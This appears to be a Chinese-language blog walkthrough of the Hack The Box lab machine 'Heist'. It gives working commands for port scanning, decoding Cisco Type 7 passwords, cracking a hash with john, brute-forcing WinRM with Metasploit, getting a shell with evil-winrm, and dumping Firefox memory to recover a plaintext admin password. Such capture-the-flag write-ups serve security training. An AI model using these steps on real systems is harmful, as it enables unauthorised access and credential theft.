---
title: HTB(Hack The Box)系列—Heist
date: 2019-12-3 13:14:52
author: dylan
top: false
cover: false
categories: HTB系列
tags: 
    - HTB
    - Hack The Box
    - 靶场
---

# 0x00 前言

今天挑战的靶机是Hack The Box的“Heist”，`10.10.10.149`

# 0x01 信息收集

使用`masscan`进行全端口扫描

`masscan -p 1-65535,U:1-65535 -e tun0 10.10.10.149 --rate=1000`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202160154.png)

使用`nmap`查看端口详细信息

`nmap -A -p 80,135,445,5985,49669 10.10.10.149`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202161302.png)

尝试连接`smb`，发现需要密码

`smbclient --list 10.10.10.149 -U ""`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202163244.png)


浏览器访问80端口，需要登陆，可以以游客身份登陆

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202163737.png)

一个叫`Hazard`的用户提交了一个`issue`，是关于他的思科路由器的问题，
并且发出了他的配置文件

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191202164032.png)

打开配置文件找到了一些用户名和密码


# 0x02 爆破密码

一般来说，思科设备的密码会以两种形式保存在IOS配置文件中，
一种是思科的`Type 7`加密形式，一种是`Type 5`加密形式。
前者是思科自己的加密形式，存在多年，但是这种加密方式很简单，是可以进行破解的。
后者相当于MD5加密，是无法被破解的（除非是弱密码，能通过字典进行暴力破解）。

`[...] enable password 7 046E1803362E595C260E0B240619050A2D`
`[...] username 'user' password 7 046E1803362E595C260E0B240619050A2D`

这样类似的语句是思科的`Type 7`加密形式

`[...] enable secret 5 $1$SpMm$eALjeyED.WSZs0naLNv22/`
`[...] username ‘user’ secret 5 $1$SpMm$eALjeyED.WSZs0naLNv22/`

这样类似的语句是思科的`Type 5`加密形式

```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0 mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```

这里给出两个在线解密网址
[http://www.ifm.net.nz/cookbooks/passwordcracker.html](http://www.ifm.net.nz/cookbooks/passwordcracker.html)
[https://www.xiaopeiqing.com/cisco-password-cracker/](https://www.xiaopeiqing.com/cisco-password-cracker/)

`Type 7`加密形式直接解密即可

`0242114B0E143F015F5D1E161713`             --->    `$uperP@ssword`
`02375012182C1A1D751618034F36415408`  --->    `Q4)sJu\Y8qz*A3?d`

`Type 5`加密形式这里使用`john`来破解
破解过的密码会存储在home目录下的隐藏文件`.john/john.pot`中

将`$1$pdQG$o8nrSzsGXeaduXrjlvKc91`添加到文本文件。
使用Kali自带的`rockyou.txt`字典（常用的弱口令大全）来破解

`$1$pdQG$o8nrSzsGXeaduXrjlvKc91`          --->    `stealth1agent`
 
如果第一次使用请解压：

`gzip -d /usr/share/wordlists/rockyou.txt.gz`

```
vim hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt 
john --show ./hash.txt 
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203141941.png)

# 0x03 SMB

猜测上面提交`issue`的用户`hazard`存在
尝试使用用户名:`hazard`  密码： `stealth1agent` 连接smb
成功连接，但是没有什么发现

`smbclient --list 10.10.10.149 -U "hazard"`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203144754.png)

# 0x04 枚举用户

然后尝试使用[lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)脚本来枚举其它用户

```
wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/lookupsid.py
python lookupsid.py hazard:stealth1agent@10.10.10.149
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203162833.png)

# 0x05 爆破Winrm

目标机上开放了winrm 5985端口
将解密出来的密码和用户名添加到txt文件
使用metasploit来尝试爆破密码

```
use auxiliary/scanner/winrm/winrm_login
set pass_file /root/HTB/Heist/password.txt
set user_file /root/HTB/Heist/user.txt
set rhosts 10.10.10.149
run
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203174209.png)

成功跑出来一个
`chase:Q4)sJu\Y8qz*A3?d`
使用[evil-winrm](https://github.com/Hackplayers/evil-winrm)工具获取shell
得到`user.txt`

```
gem install evil-winrm     // 安装evil-winrm
evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203163853.png)

# 0x06 dump进程

然后找了一圈，没发现其它的东西
查看进程，发现有几个`Firefox`进程

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203183945.png)

然后尝试上传[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)工具

`upload /root/HTB/Heist/procdump64.exe`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203184357.png)

`./procdump64.exe -mp 6176    // 6176为进程ID号`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203204506.png)

再上传[Strings](https://docs.microsoft.com/en-us/sysinternals/downloads/strings)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203205249.png)

使用`strings`工具读取`dmp`文件，并保存结果为`txt`
查找`txt`文件发现该浏览器不断请求这个url 并且是明文密码传输

```
cmd /c "strings64.exe -accepteula firefox.exe_191203_172802.dmp > firefox.exe_191203_172802.txt"
findstr "password" ./firefox.exe_191203_172802.txt
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203204836.png)

# 0x07 登陆admin

尝试用链接中的密码`4dD!5}x/re8]FBuZ`登陆`Administrator`
成功登陆获取`root.txt`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191203210511.png)

# 参考文章

[evil-winrm：Windows远程管理（WinRM）Shell终极版](https://www.freebuf.com/sectool/210479.html)
[Hack The Box - Heist | 0xRick](https://0xrick.github.io/hack-the-box/heist/)
[infosec.rm-it.de](https://infosec.rm-it.de/)
[CrackMapExec：一款针对大型Windows活动目录(AD)的后渗透工具](https://www.freebuf.com/sectool/184573.html)